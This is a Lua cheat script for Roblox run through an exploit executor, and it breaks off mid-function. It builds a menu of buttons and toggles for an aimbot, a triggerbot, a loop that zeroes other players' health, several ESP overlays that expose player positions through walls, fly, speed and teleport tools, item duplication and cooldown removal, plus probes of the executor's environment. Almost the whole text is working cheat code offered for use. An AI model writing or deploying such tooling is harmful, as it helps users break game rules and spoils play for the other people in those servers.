NXFeExploits:CreateButton({name="REMOVE TORSO", callback=function()
    pcall(function()
        local torso = Player.Character:WaitForChild('Torso', 2) or Player.Character:WaitForChild('UpperTorso', 2)
        if torso then torso:Destroy(); NXNotify('TORSO', 'Removed') end
    end)
end})

NXFeExploits:CreateButton({name="REMOVE ARMS", callback=function()
    pcall(function()
        local ra = Player.Character:WaitForChild('RightArm', 2) or Player.Character:WaitForChild('RightUpperArm', 2)
        local la = Player.Character:WaitForChild('LeftArm', 2) or Player.Character:WaitForChild('LeftUpperArm', 2)
        if ra then ra:Destroy() end; if la then la:Destroy() end
        NXNotify('ARMS', 'Removed')
    end)
end})

NXFeExploits:CreateButton({name="REMOVE LEGS", callback=function()
    pcall(function()
        local rl = Player.Character:WaitForChild('RightLeg', 2) or Player.Character:WaitForChild('RightLowerLeg', 2)
        local ll = Player.Character:WaitForChild('LeftLeg', 2) or Player.Character:WaitForChild('LeftLowerLeg', 2)
        if rl then rl:Destroy() end; if ll then ll:Destroy() end
        NXNotify('LEGS', 'Removed')
    end)
end})

NXFeExploits:CreateButton({name="REMOVE FACE", callback=function()
    pcall(function()
        local head = Player.Character:WaitForChild('Head', 2)
        if head then local face = head:FindFirstChildOfClass('Face'); if face then face:Destroy() end end
        NXNotify('FACE', 'Removed')
    end)
end})

NXFeExploits:CreateButton({name="SCALE HEAD x2", callback=function()
    pcall(function()
        local head = Player.Character:WaitForChild('Head', 2)
        if head then head.Size = head.Size * 2; NXNotify('HEAD', 'Scaled x2') end
    end)
end})

NXFeExploits:CreateButton({name="SCALE TORSO x2", callback=function()
    pcall(function()
        local torso = Player.Character:WaitForChild('Torso', 2) or Player.Character:WaitForChild('UpperTorso', 2)
        if torso then torso.Size = torso.Size * 2; NXNotify('TORSO', 'Scaled x2') end
    end)
end})

NXFeExploits:CreateButton({name="SCALE LEGS x2", callback=function()
    pcall(function()
        local c = Player.Character
        for _, n in pairs({'LeftLeg', 'RightLeg', 'LeftLowerLeg', 'RightLowerLeg'}) do
            local part = c:FindFirstChild(n); if part then part.Size = part.Size * 2 end
        end
        NXNotify('LEGS', 'Scaled x2')
    end)
end})

NXFeExploits:CreateToggle({name="HIDE CHARACTER (Local)", value=false, callback=function(v)
    if v then
        _nxHideParts = Player.Character:GetDescendants()
        for _, p in pairs(_nxHideParts) do
            if p:IsA('BasePart') or p:IsA('Decal') or p:IsA('Accessory') then p.LocalTransparencyModifier = 1 end
        end
    else
        for _, p in pairs(_nxHideParts or {}) do
            if p and p.Parent then p.LocalTransparencyModifier = 0 end
        end
        _nxHideParts = nil
    end
    NXNotify('HIDE CHAR', v and 'ON' or 'OFF')
end})

NXFeExploits:CreateButton({name="REMOVE ALL ACCESSORIES", callback=function()
    pcall(function()
        local c = Player.Character
        local count = 0
        for _, d in pairs(c:GetDescendants()) do
            if d:IsA('Accessory') or d:IsA('AccessoryHandle') then d:Destroy(); count = count + 1 end
        end
        NXNotify('ACCESSORIES', tostring(count) .. ' removed')
    end)
end})

-- ANIMATIONS / EMOTES PRO
NXFeExploits:CreateSection({name="ANIMATIONS / EMOTES PRO"})

NXFeExploits:CreateButton({name="REMOVE ANIMATIONS (Local)", callback=function()
    pcall(function()
        local animator = Player.Character:FindFirstChild('Animator')
        if animator then for _, tr in pairs(animator:GetPlayingTracks()) do tr:Stop() end end
        NXNotify('ANIMATIONS', 'Stopped all')
    end)
end})

NXFeExploits:CreateToggle({name="PLAY DEFAULT EMOTE", value=false, callback=function(v)
    if v then
        _nxEmoteConn = RunService.Heartbeat:Connect(function()
            local anim = Instance.new('Animation')
            anim.AnimationId = 'rbxassetid://507732009'
            local animator = Player.Character:FindFirstChild('Animator')
            if animator then local track = animator:LoadAnimation(anim); track:Play() end
        end)
    else
        if _nxEmoteConn then _nxEmoteConn:Disconnect(); _nxEmoteConn = nil end
    end
    NXNotify('EMOTE', v and 'ON' or 'OFF')
end})

NXFeExploits:CreateButton({name="GET ANIMATION IDS", callback=function()
    pcall(function()
        local lines = {}
        for _, a in pairs(ReplicatedStorage:GetDescendants()) do
            if a:IsA('Animation') then table.insert(lines, a.Name .. ': ' .. tostring(a.AnimationId)) end
        end
        if #lines == 0 then NXNotify('ANIMS', 'None found in ReplicatedStorage') else print('=== ANIMS ===\n' .. table.concat(lines, '\n')) end
    end)
end})

NXFeExploits:CreateButton({name="STOP ALL EMOTES", callback=function()
    pcall(function()
        local animator = Player.Character:FindFirstChild('Animator')
        if animator then for _, tr in pairs(animator:GetPlayingTracks()) do tr:Stop() end end
        NXNotify('EMOTES', 'Stopped')
    end)
end})

-- INVENTORY PRO
NXFeExploits:CreateSection({name="INVENTORY PRO"})

NXFeExploits:CreateButton({name="REMOVE TOOLS (Char)", callback=function()
    pcall(function()
        local tools = Player.Character:FindFirstChild('Backpack') or Player:FindFirstChild('Backpack')
        local count = 0
        local char = Player.Character
        for _, d in pairs(char:GetDescendants()) do
            if d:IsA('Tool') then d:Destroy(); count = count + 1 end
        end
        if tools then for _, t in pairs(tools:GetChildren()) do if t:IsA('Tool') then t:Destroy(); count = count + 1 end end end
        NXNotify('TOOLS', tostring(count) .. ' removed')
    end)
end})

NXFeExploits:CreateButton({name="DUPLICATE TOOLS (Char)", callback=function()
    pcall(function()
        local char = Player.Character
        local count = 0
        for _, d in pairs(char:GetDescendants()) do
            if d:IsA('Tool') then local cp = d:Clone(); cp.Parent = char; count = count + 1 end
        end
        NXNotify('TOOLS', tostring(count) .. ' duplicated')
    end)
end})

NXFeExploits:CreateButton({name="REMOVE TOOL CD (All)", callback=function()
    pcall(function()
        local count = 0
        for _, d in pairs(ReplicatedStorage:GetDescendants()) do
            if d:IsA('Tool') then
                for _, cd in pairs(d:GetDescendants()) do
                    if cd:IsA('ValueRange') or cd:IsA('NumberValue') then cd.Value = 0 end
                end
                count = count + 1
            end
        end
        NXNotify('TOOL CD', tostring(count) .. ' tools reset')
    end)
end})

NXFeExploits:CreateButton({name="EQUIP ALL TOOLS", callback=function()
    pcall(function()
        local backpack = Player:FindFirstChild('Backpack')
        local count = 0
        if backpack then
            for _, t in pairs(backpack:GetChildren()) do
                if t:IsA('Tool') then t.Parent = Player.Character; count = count + 1 end
            end
        end
        NXNotify('EQUIP', tostring(count) .. ' equipped')
    end)
end})

-- CHARACTER INFO
NXFeExploits:CreateSection({name="CHARACTER INFO"})

NXFeExploits:CreateButton({name="GET HUMANOID DATA", callback=function()
    pcall(function()
        local hum = Player.Character:FindFirstChildOfClass('Humanoid')
        if hum then
            local lines = {
                'Health: ' .. tostring(hum.Health) .. '/' .. tostring(hum.MaxHealth),
                'WalkSpeed: ' .. tostring(hum.WalkSpeed),
                'JumpPower: ' .. tostring(hum.JumpPower),
                'MoveSpeed: ' .. tostring(hum.MoveSpeed)
            }
            print('=== HUMANOID ===\n' .. table.concat(lines, '\n'))
            NXNotify('HUMANOID', 'Printed')
        end
    end)
end})

NXFeExploits:CreateButton({name="GET POSITION", callback=function()
    pcall(function()
        local pos = Player.Character and Player.Character:WaitForChild('HumanoidRootPart', 2)
        local p = pos and pos.Position
        if p then NXNotify('POSITION', string.format('%.0f, %.0f, %.0f', p.X, p.Y, p.Z)) end
    end)
end})

NXFeExploits:CreateButton({name="GET ALL PART NAMES", callback=function()
    pcall(function()
        local lines = {}
        for _, d in pairs(Player.Character:GetDescendants()) do
            if d:IsA('BasePart') then table.insert(lines, d.Name) end
        end
        print('=== PARTS ===\n' .. table.concat(lines, ', '))
        NXNotify('PARTS', tostring(#lines) .. ' found')
    end)
end})

NXFeExploits:CreateButton({name="GET CHARACTER NAME", callback=function()
    pcall(function()
        local c = Player.Character
        if c then NXNotify('CHAR NAME', c.Name) end
    end)
end})

-- EXPLOIT PRO
NXFeExploits:CreateSection({name="EXPLOIT PRO"})

NXFeExploits:CreateButton({name="EXECUTOR NAME", callback=function()
    pcall(function()
        local name = 'Unknown'
        if getgenv().getexecutorname then name = getexecutorname() end
        if name == 'Unknown' and getgenv().get_environment then name = get_environment() end
        NXNotify('EXECUTOR', name)
    end)
end})

NXFeExploits:CreateButton({name="EXECUTOR VERSION", callback=function()
    pcall(function()
        local ver = 'Unknown'
        if getgenv().getexecutorversion then ver = getexecutorversion() end
        NXNotify('VERSION', ver)
    end)
end})

NXFeExploits:CreateButton({name="GET FUNCTIONS", callback=function()
    pcall(function()
        local lines = {}
        for k, v in pairs(getgenv()) do
            if type(v) == 'function' then table.insert(lines, k) end
        end
        table.sort(lines)
        print('=== FUNCTIONS (' .. tostring(#lines) .. ') ===\n' .. table.concat(lines, '\n'))
        NXNotify('FUNCTIONS', tostring(#lines) .. ' found')
    end)
end})

NXFeExploits:CreateButton({name="CHECK KEYLESS", callback=function()
    pcall(function()
        local keyless = true
        if getgenv().identifyexecutor then
            local info = identifyexecutor()
            keyless = (info and info.Keyless == true)
        end
        NXNotify('KEYLESS', keyless and 'YES' or 'NO')
    end)
end})

NXFeExploits:CreateButton({name="EXECUTOR INFO", callback=function()
    pcall(function()
        local lines = {}
        local name = 'Unknown'
        local ver = 'Unknown'
        if getexecutorname then name = tostring(getexecutorname()) end
        if getexecutorversion then ver = tostring(getexecutorversion()) end
        table.insert(lines, 'Name: ' .. name)
        table.insert(lines, 'Version: ' .. ver)
        print('=== EXECUTOR ===\n' .. table.concat(lines, '\n'))
        NXNotify('EXECUTOR INFO', 'Printed')
    end)
end})

-- NETWORK / SERVER INFO
NXFeExploits:CreateSection({name="NETWORK / SERVER INFO"})

NXFeExploits:CreateButton({name="SERVER ID", callback=function()
    pcall(function()
        local id = game.JobId or game.PlaceId
        NXNotify('SERVER ID', tostring(id))
    end)
end})

NXFeExploits:CreateButton({name="PLACE ID", callback=function()
    pcall(function()
        local id = game.PlaceId
        NXNotify('PLACE ID', tostring(id))
    end)
end})

NXFeExploits:CreateButton({name="GAME NAME", callback=function()
    pcall(function()
        local name = game.Name
        NXNotify('GAME', name)
    end)
end})

-- PLAYER / SERVER
NXFeExploits:CreateSection({name="PLAYER / SERVER"})

NXFeExploits:CreateButton({name="PLAYER LIST", callback=function()
    pcall(function()
        local lines = {}
        for i, p in ipairs(Players:GetPlayers()) do
            table.insert(lines, i .. '. ' .. p.Name .. ' (' .. tostring(p.UserId) .. ')')
        end
        print('=== PLAYERS (' .. tostring(#lines) .. ') ===\n' .. table.concat(lines, '\n'))
        NXNotify('PLAYERS', tostring(#lines) .. ' online')
    end)
end})

NXFeExploits:CreateButton({name="DUPLICATE CHARACTER", callback=function()
    pcall(function()
        local cp = Player.Character:Clone()
        cp.Name = cp.Name .. '_COPY'
        cp.Parent = Workspace
        NXNotify('DUPLICATE', 'Cloned to workspace')
    end)
end})

-- CHARACTER UTILS
NXFeExploits:CreateSection({name="CHARACTER UTILS"})

NXFeExploits:CreateButton({name="TP TO POSITION", callback=function()
    pcall(function()
        local root = Player.Character:FindFirstChild('HumanoidRootPart')
        if root then
            root.CFrame = CFrame.new(0, 100, 0)
            NXNotify('TP', 'Moved to (0, 100, 0)')
        end
    end)
end})

NXFeExploits:CreateButton({name="CLONE CHARACTER", callback=function()
    pcall(function()
        local cp = Player.Character:Clone()
        cp.Parent = Workspace
        NXNotify('CLONE', 'Cloned to workspace')
    end)
end})

NXFeExploits:CreateButton({name="REMOVE ACCESSORIES", callback=function()
    pcall(function()
        local c = Player.Character
        local count = 0
        for _, d in pairs(c:GetDescendants()) do
            if d:IsA('Accessory') or d:IsA('AccessoryHandle') then d:Destroy(); count = count + 1 end
        end
        NXNotify('ACCESSORIES', tostring(count) .. ' removed')
    end)
end})

NXFeExploits:CreateToggle({name="CAMERA BOB OFF", value=false, callback=function(v)
    local cam = Workspace.CurrentCamera
    if v then
        _nxOldBob = cam.CameraBobEnabled; cam.CameraBobEnabled = false
    else
        if _nxOldBob ~= nil then cam.CameraBobEnabled = _nxOldBob; _nxOldBob = nil end
    end
    NXNotify('CAMERA BOB', v and 'OFF' or 'ON')
end})

NXFeExploits:CreateButton({name="RESET CHARACTER STATS", callback=function()
    pcall(function()
        local hum = Player.Character:FindFirstChildOfClass('Humanoid')
        if hum then hum.WalkSpeed = 16; hum.JumpPower = 50; hum.MoveSpeed = 16 end
        local cam = Workspace.CurrentCamera
        cam.FieldOfView = 70
        cam.CameraBobEnabled = true
        NXNotify('RESET', 'All character stats reset')
    end)
end})



-- COMBAT ULTRA
NXFeExploits:CreateSection({name="COMBAT ULTRA"})

NXFeExploits:CreateToggle({name="AIMBOT (Closest Head)", value=false, callback=function(v)
    if v then
        _nxAimbot = RunService.RenderStepped:Connect(function()
            local cam = Workspace.CurrentCamera
            local closest, dist = nil, math.huge
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= Player and plr.Character then
                    local head = plr.Character:FindFirstChild("Head")
                    if head then
                        local pos, onScreen = cam:WorldToViewportPoint(head.Position)
                        if onScreen then
                            local d = (Vector2.new(pos.X, pos.Y) - Vector2.new(cam.ViewportSize.X/2, cam.ViewportSize.Y/2)).Magnitude
                            if d < dist then dist = d; closest = head end
                        end
                    end
                end
            end
            if closest then cam.CFrame = CFrame.new(cam.CFrame.Position, closest.Position) end
        end)
    else
        if _nxAimbot then _nxAimbot:Disconnect(); _nxAimbot = nil end
    end
    NXNotify("AIMBOT", v and "ON" or "OFF")
end})

NXFeExploits:CreateToggle({name="SILENT AIM (Hook)", value=false, callback=function(v)
    NXNotify("SILENT AIM", "Game-specific hook required")
end})

NXFeExploits:CreateToggle({name="TRIGGERBOT", value=false, callback=function(v)
    if v then
        _nxTrigger = RunService.Heartbeat:Connect(function()
            local mouse = Player:GetMouse()
            if mouse.Target then
                local model = mouse.Target:FindFirstAncestorOfClass("Model")
                if model then
                    local hum = model:FindFirstChildOfClass("Humanoid")
                    if hum and hum.Health > 0 and Players:GetPlayerFromCharacter(model) then
                        mouse1click()
                    end
                end
            end
        end)
    else
        if _nxTrigger then _nxTrigger:Disconnect(); _nxTrigger = nil end
    end
    NXNotify("TRIGGERBOT", v and "ON" or "OFF")
end})

NXFeExploits:CreateToggle({name="KILL ALL LOOP", value=false, callback=function(v)
    if v then
        _nxKillAll = RunService.Heartbeat:Connect(function()
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= Player and plr.Character then
                    local hum = plr.Character:FindFirstChildOfClass("Humanoid")
                    if hum and hum.Health > 0 then hum.Health = 0 end
                end
            end
        end)
    else
        if _nxKillAll then _nxKillAll:Disconnect(); _nxKillAll = nil end
    end
    NXNotify("KILL ALL LOOP", v and "ON" or "OFF")
end})

NXFeExploits:CreateToggle({name="ANTI KNOCKBACK", value=false, callback=function(v)
    if v then
        _nxAntiKb = RunService.Heartbeat:Connect(function()
            local root = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if root then root.AssemblyLinearVelocity = Vector3.new(root.AssemblyLinearVelocity.X, 0, root.AssemblyLinearVelocity.Z) end
        end)
    else
        if _nxAntiKb then _nxAntiKb:Disconnect(); _nxAntiKb = nil end
    end
    NXNotify("ANTI KNOCKBACK", v and "ON" or "OFF")
end})

NXFeExploits:CreateToggle({name="VELOCITY SPOOFER", value=false, callback=function(v)
    if v then
        _nxVelSpoof = RunService.Heartbeat:Connect(function()
            local root = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if root then root.AssemblyLinearVelocity = Vector3.new(0, 0, 0) end
        end)
    else
        if _nxVelSpoof then _nxVelSpoof:Disconnect(); _nxVelSpoof = nil end
    end
    NXNotify("VELOCITY SPOOFER", v and "ON" or "OFF")
end})

NXFeExploits:CreateButton({name="NO RECOIL (Hook)", callback=function()
    NXNotify("NO RECOIL", "Game-specific hook required")
end})

NXFeExploits:CreateButton({name="RAPID FIRE (Hook)", callback=function()
    NXNotify("RAPID FIRE", "Game-specific hook required")
end})

NXFeExploits:CreateButton({name="INF AMMO (Hook)", callback=function()
    NXNotify("INF AMMO", "Game-specific hook required")
end})

NXFeExploits:CreateButton({name="DAMAGE INDICATORS", callback=function()
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= Player and plr.Character then
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if hum then
                local old = hum.Health
                hum.HealthChanged:Connect(function(new)
                    if new < old then
                        local gui = Instance.new("BillboardGui", plr.Character)
                        gui.Size = UDim2.new(0, 100, 0, 50)
                        gui.StudsOffset = Vector3.new(0, 3, 0)
                        local lbl = Instance.new("TextLabel", gui)
                        lbl.Size = UDim2.new(1, 0, 1, 0)
                        lbl.Text = "-" .. tostring(old - new)
                        lbl.TextColor3 = Color3.new(1, 0, 0)
                        lbl.BackgroundTransparency = 1
                        lbl.TextScaled = true
                        game:GetService("Debris"):AddItem(gui, 2)
                    end
                    old = new
                end)
            end
        end
    end
    NXNotify("DAMAGE INDICATORS", "Applied")
end})

-- MOVEMENT ULTRA
NXFeExploits:CreateSection({name="MOVEMENT ULTRA"})

NXFeExploits:CreateToggle({name="BUNNY HOP", value=false, callback=function(v)
    if v then
        _nxBhop = RunService.Heartbeat:Connect(function()
            local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
            local root = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if hum and root and hum.FloorMaterial ~= Enum.Material.Air then
                root.AssemblyLinearVelocity = Vector3.new(root.AssemblyLinearVelocity.X, 80, root.AssemblyLinearVelocity.Z)
            end
        end)
    else
        if _nxBhop then _nxBhop:Disconnect(); _nxBhop = nil end
    end
    NXNotify("BUNNY HOP", v and "ON" or "OFF")
end})

NXFeExploits:CreateToggle({name="AUTO SPRINT", value=false, callback=function(v)
    if v then
        _nxSprint = RunService.Heartbeat:Connect(function()
            local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
            if hum then hum.WalkSpeed = 30 end
        end)
    else
        if _nxSprint then _nxSprint:Disconnect(); _nxSprint = nil end
        local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.WalkSpeed = 16 end
    end
    NXNotify("AUTO SPRINT", v and "ON" or "OFF")
end})

NXFeExploits:CreateToggle({name="WALL CLIMB", value=false, callback=function(v)
    if v then
        _nxWallClimb = RunService.Heartbeat:Connect(function()
            local root = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
            if root and hum then
                local params = RaycastParams.new()
                params.FilterDescendantsInstances = {Player.Character}
                params.FilterType = Enum.RaycastFilterType.Exclude
                local front = workspace:Raycast(root.Position, root.CFrame.LookVector * 3, params)
                if front then
                    root.AssemblyLinearVelocity = Vector3.new(root.AssemblyLinearVelocity.X, 50, root.AssemblyLinearVelocity.Z)
                end
            end
        end)
    else
        if _nxWallClimb then _nxWallClimb:Disconnect(); _nxWallClimb = nil end
    end
    NXNotify("WALL CLIMB", v and "ON" or "OFF")
end})

NXFeExploits:CreateButton({name="LADDER GLITCH", callback=function()
    local root = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
    if root then
        local bp = Instance.new("BodyPosition", root)
        bp.Position = root.Position + Vector3.new(0, 50, 0)
        bp.MaxForce = Vector3.new(0, 1e6, 0)
        game:GetService("Debris"):AddItem(bp, 2)
        NXNotify("LADDER GLITCH", "Applied")
    end
end})

NXFeExploits:CreateToggle({name="FLY V2 (CFrame)", value=false, callback=function(v)
    if v then
        _nxFly2 = RunService.RenderStepped:Connect(function()
            local root = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
            if root and hum then
                local dir = Vector3.new()
                if Player:GetMouse().Hit then
                    local cam = Workspace.CurrentCamera
                    if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.W) then dir = dir + cam.CFrame.LookVector end
                    if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.S) then dir = dir - cam.CFrame.LookVector end
                    if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.A) then dir = dir - cam.CFrame.RightVector end
                    if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.D) then dir = dir + cam.CFrame.RightVector end
                    if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.Space) then dir = dir + Vector3.new(0, 1, 0) end
                    if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.LeftShift) then dir = dir - Vector3.new(0, 1, 0) end
                end
                root.CFrame = root.CFrame + dir * 2
            end
        end)
    else
        if _nxFly2 then _nxFly2:Disconnect(); _nxFly2 = nil end
    end
    NXNotify("FLY V2", v and "ON" or "OFF")
end})

NXFeExploits:CreateButton({name="JETPACK (Tool)", callback=function()
    local tool = Instance.new("Tool")
    tool.Name = "Jetpack"
    tool.RequiresHandle = false
    tool.Parent = Player.Backpack
    local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    local root = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
    tool.Equipped:Connect(function()
        local bp = Instance.new("BodyPosition", root)
        bp.MaxForce = Vector3.new(1e6, 1e6, 1e6)
        _nxJetpack = RunService.RenderStepped:Connect(function()
            bp.Position = root.Position + (Workspace.CurrentCamera.CFrame.LookVector * 50) + Vector3.new(0, 10, 0)
        end)
    end)
    tool.Unequipped:Connect(function()
        if _nxJetpack then _nxJetpack:Disconnect(); _nxJetpack = nil end
        local bp = root:FindFirstChildOfClass("BodyPosition")
        if bp then bp:Destroy() end
    end)
    NXNotify("JETPACK", "Equip tool")
end})

NXFeExploits:CreateButton({name="SPEED COIL (Tool)", callback=function()
    local tool = Instance.new("Tool")
    tool.Name = "Speed Coil"
    tool.RequiresHandle = true
    local handle = Instance.new("Part", tool)
    handle.Name = "Handle"
    handle.Size = Vector3.new(1, 1, 4)
    handle.Anchored = false
    handle.Massless = true
    tool.Parent = Player.Backpack
    tool.Equipped:Connect(function()
        local hum = Player.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.WalkSpeed = 100 end
    end)
    tool.Unequipped:Connect(function()
        local hum = Player.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.WalkSpeed = 16 end
    end)
    NXNotify("SPEED COIL", "Equip tool")
end})

NXFeExploits:CreateButton({name="GRAVITY COIL (Tool)", callback=function()
    local tool = Instance.new("Tool")
    tool.Name = "Gravity Coil"
    tool.RequiresHandle = true
    local handle = Instance.new("Part", tool)
    handle.Name = "Handle"
    handle.Size = Vector3.new(1, 1, 4)
    handle.Anchored = false
    handle.Massless = true
    tool.Parent = Player.Backpack
    tool.Equipped:Connect(function()
        Workspace.Gravity = 50
    end)
    tool.Unequipped:Connect(function()
        Workspace.Gravity = 196.2
    end)
    NXNotify("GRAVITY COIL", "Equip tool")
end})

NXFeExploits:CreateButton({name="TP TOOL (Click)", callback=function()
    local tool = Instance.new("Tool")
    tool.Name = "Click TP"
    tool.RequiresHandle = false
    tool.Parent = Player.Backpack
    tool.Activated:Connect(function()
        local mouse = Player:GetMouse()
        local root = Player.Character:FindFirstChild("HumanoidRootPart")
        if root and mouse.Hit then
            root.CFrame = mouse.Hit + Vector3.new(0, 5, 0)
        end
    end)
    NXNotify("TP TOOL", "Equip and click")
end})

-- VISUAL ULTRA
NXFeExploits:CreateSection({name="VISUAL ULTRA"})

NXFeExploits:CreateToggle({name="CHAMS (Highlight)", value=false, callback=function(v)
    if v then
        _nxChams = {}
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= Player and plr.Character then
                local hl = Instance.new("Highlight", plr.Character)
                hl.FillColor = Color3.new(1, 0, 0)
                hl.OutlineColor = Color3.new(1, 1, 1)
                hl.FillTransparency = 0.5
                hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                table.insert(_nxChams, hl)
            end
        end
        _nxChamsConn = Players.PlayerAdded:Connect(function(plr)
            plr.CharacterAdded:Connect(function(char)
                local hl = Instance.new("Highlight", char)
                hl.FillColor = Color3.new(1, 0, 0)
                hl.OutlineColor = Color3.new(1, 1, 1)
                hl.FillTransparency = 0.5
                hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                table.insert(_nxChams, hl)
            end)
        end)
    else
        if _nxChamsConn then _nxChamsConn:Disconnect(); _nxChamsConn = nil end
        for _, hl in pairs(_nxChams or {}) do if hl then hl:Destroy() end end
        _nxChams = nil
    end
    NXNotify("CHAMS", v and "ON" or "OFF")
end})

NXFeExploits:CreateToggle({name="TRACERS (Lines)", value=false, callback=function(v)
    if v then
        _nxTracers = {}
        _nxTracerConn = RunService.RenderStepped:Connect(function()
            for _, t in pairs(_nxTracers) do if t then t:Destroy() end end
            _nxTracers = {}
            local cam = Workspace.CurrentCamera
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= Player and plr.Character then
                    local root = plr.Character:FindFirstChild("HumanoidRootPart")
                    local head = plr.Character:FindFirstChild("Head")
                    if root then
                        local screenPos, onScreen = cam:WorldToViewportPoint(root.Position)
                        if onScreen then
                            local line = Drawing.new("Line")
                            line.From = Vector2.new(cam.ViewportSize.X/2, cam.ViewportSize.Y)
                            line.To = Vector2.new(screenPos.X, screenPos.Y)
                            line.Color = Color3.new(1, 0, 0)
                            line.Thickness = 1
                            line.Visible = true
                            table.insert(_nxTracers, line)
                        end
                    end
                end
            end
        end)
    else
        if _nxTracerConn then _nxTracerConn:Disconnect(); _nxTracerConn = nil end
        for _, t in pairs(_nxTracers or {}) do if t then t:Remove() end end
        _nxTracers = nil
    end
    NXNotify("TRACERS", v and "ON" or "OFF")
end})

NXFeExploits:CreateToggle({name="BOX ESP", value=false, callback=function(v)
    if v then
        _nxBoxEsp = {}
        _nxBoxConn = RunService.RenderStepped:Connect(function()
            for _, b in pairs(_nxBoxEsp) do if b then b:Destroy() end end
            _nxBoxEsp = {}
            local cam = Workspace.CurrentCamera
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= Player and plr.Character then
                    local root = plr.Character:FindFirstChild("HumanoidRootPart")
                    if root then
                        local pos, onScreen = cam:WorldToViewportPoint(root.Position)
                        if onScreen then
                            local box = Drawing.new("Square")
                            box.Size = Vector2.new(100, 150)
                            box.Position = Vector2.new(pos.X - 50, pos.Y - 150)
                            box.Color = Color3.new(1, 0, 0)
                            box.Thickness = 2
                            box.Filled = false
                            box.Visible = true
                            table.insert(_nxBoxEsp, box)
                        end
                    end
                end
            end
        end)
    else
        if _nxBoxConn then _nxBoxConn:Disconnect(); _nxBoxConn = nil end
        for _, b in pairs(_nxBoxEsp or {}) do if b then b:Remove() end end
        _nxBoxEsp = nil
    end
    NXNotify("BOX ESP", v and "ON" or "OFF")
end})

NXFeExploits:CreateToggle({name="SKELETON ESP", value=false, callback=function(v)
    if v then
        _nxSkel = {}
        _nxSkelConn = RunService.RenderStepped:Connect(function()
            for _, l in pairs(_nxSkel) do if l then l:Remove() end end
            _nxSkel = {}
            local cam = Workspace.CurrentCamera
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= Player and plr.Character then
                    local function getPart(n) return plr.Character:FindFirstChild(n) end
                    local parts = {
                        getPart("Head"), getPart("Torso") or getPart("UpperTorso"),
                        getPart("LeftArm") or getPart("LeftUpperArm"), getPart("RightArm") or getPart("RightUpperArm"),
                        getPart("LeftLeg") or getPart("LeftLowerLeg"), getPart("RightLeg") or getPart("RightLowerLeg")
                    }
                    local prev = nil
                    for _, p in pairs(parts) do
                        if p then
                            local pos, onScreen = cam:WorldToViewportPoint(p.Position)
                            if onScreen then
                                local dot = Drawing.new("Circle")
                                dot.Radius = 3
                                dot.Position = Vector2.new(pos.X, pos.Y)
                                dot.Color = Color3.new(0, 1, 0)
                                dot.Filled = true
                                dot.Visible = true
                                table.insert(_nxSkel, dot)
                                if prev then
                                    local line = Drawing.new("Line")
                                    line.From = prev
                                    line.To = Vector2.new(pos.X, pos.Y)
                                    line.Color = Color3.new(0, 1, 0)
                                    line.Thickness = 2
                                    line.Visible = true
                                    table.insert(_nxSkel, line)
                                end
                                prev = Vector2.new(pos.X, pos.Y)
                            end
                        end
                    end
                end
            end
        end)
    else
        if _nxSkelConn then _nxSkelConn:Disconnect(); _nxSkelConn = nil end
        for _, l in pairs(_nxSkel or {}) do if l then l:Remove() end end
        _nxSkel = nil
    end
    NXNotify("SKELETON ESP", v and "ON" or "OFF")
end})

NXFeExploits:CreateToggle({name="DISTANCE ESP", value=false, callback=function(v)
    if v then
        _nxDist = {}
        _nxDistConn = RunService.RenderStepped:Connect(function()
            for _, d in pairs(_nxDist) do if d then d:Remove() end end
            _nxDist = {}
            local cam = Workspace.CurrentCamera
            local myRoot = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= Player and plr.Character and myRoot then
                    local root = plr.Character:FindFirstChild("HumanoidRootPart")
                    if root then
                        local pos, onScreen = cam:WorldToViewportPoint(root.Position)
                        if onScreen then
                            local dist = math.floor((myRoot.Position - root.Position).Magnitude)
                            local txt = Drawing.new("Text")
                            txt.Text = tostring(dist) .. " studs"
                            txt.Position = Vector2.new(pos.X, pos.Y - 30)
                            txt.Color = Color3.new(1, 1, 1)
                            txt.Size = 14
                            txt.Center = true
                            txt.Visible = true
                            table.insert(_nxDist, txt)
                        end
                    end
                end
            end
        end)
    else
        if _nxDistConn then _nxDistConn:Disconnect(); _nxDistConn = nil end
        for _, d in pairs(_nxDist or {}) do if d then d:Remove() end end
        _nxDist = nil
    end
    NXNotify("DISTANCE ESP", v and "ON" or "OFF")
end})

NXFeExploits:CreateToggle({name="HEALTH BAR ESP", value=false, callback=function(v)
    if v then
        _nxHp = {}
        _nxHpConn = RunService.RenderStepped:Connect(function()
            for _, h in pairs(_nxHp) do if h then h:Remove() end end
            _nxHp = {}
            local cam = Workspace.CurrentCamera
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= Player and plr.Character then
                    local hum = plr.Character:FindFirstChildOfClass("Humanoid")
